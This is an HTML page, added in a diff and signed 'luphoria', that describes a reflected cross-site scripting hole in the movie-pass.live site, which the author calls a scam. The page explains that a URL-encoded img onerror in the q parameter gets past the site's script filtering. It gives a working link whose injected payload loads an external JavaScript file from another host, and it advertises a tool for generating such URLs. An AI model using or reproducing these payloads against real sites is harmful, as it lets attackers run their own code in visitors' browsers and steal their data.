@@ -1,0 +1,50 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <meta http-equiv="X-UA-Compatible" content="ie=edge">
+    <style>
+        * {
+            background-color: rgb(54, 54, 54);
+        }
+        h1,h2,h3,code,i,b,strong,em,u,a,img,div,p {
+            color: white;
+            font-family: 'Courier New', Courier, monospace;
+            text-align: center;
+            background: none;
+        }
+        #text {
+            color: white;
+            font-family:'Trebuchet MS', 'Lucida Sans Unicode', 'Lucida Grande', 'Lucida Sans', Arial, sans-serif;
+            text-align: center;
+            background: none;
+        }
+        input,button {
+            background-color:white;
+            color:black;
+            text-align:center;
+        }
+    </style>
+    <title>movie-pass.live XSS</title>
+</head>
+<body>
+    <h1>movie-pass.live XSS</h1>
+    <p>
+        movie-pass.live is a scam website that attempts to get an email:password from the end user. The way it does this is by targeted advertising defined by the URL.<br />
+        https://movie-pass.live/su/?s=S&cid=REFERRER-ID&q=MOVIE-TITLE&a=A&img=HEADERBANNERIMG is the structure of these URLs. If you paste that into your URL bar to visit the page, you'll actually see it leads to an advertisement for "MOVIE-TITLE".<br />
+        With the MOVIE-TITLE we can inject HTML into the page. If you try to use a script tag, however, it will detect this and remove the tag. So how can we do it anyways?
+    </p>
+    <p><i>an img onerror element.</i></p>
+    <p>
+        img onerror is the most well-known XSS method. Most pages do not allow this, as of how popular this method is. But movie-pass.live does not.<br />
+        Simply url encode an img onerror, and watch the magic happen!
+    </p>
+    <p>
+        I was actually able to get injected js files to work. You can see that here:<br />
+        <a href="https://movie-pass.live/su/?s=xss&cid=&q=%3Cimg+src+onerror%3D%22document.write(%27%3Cscript+src%3D\https://kontackt.co/XSS-externalLink.js%3E%3C%2Fscript%3E%27)%22%3E%3C%2Fimg%3E&a=3&img=" target="_blank">movie-pass.live</a>
+    </p>
+    <p>Use <a href="generatorTool.html">Generator Tool</a> to generate your own URL with any html you want!</p>
+    <i> - luphoria</i>
+</body>
+</html>
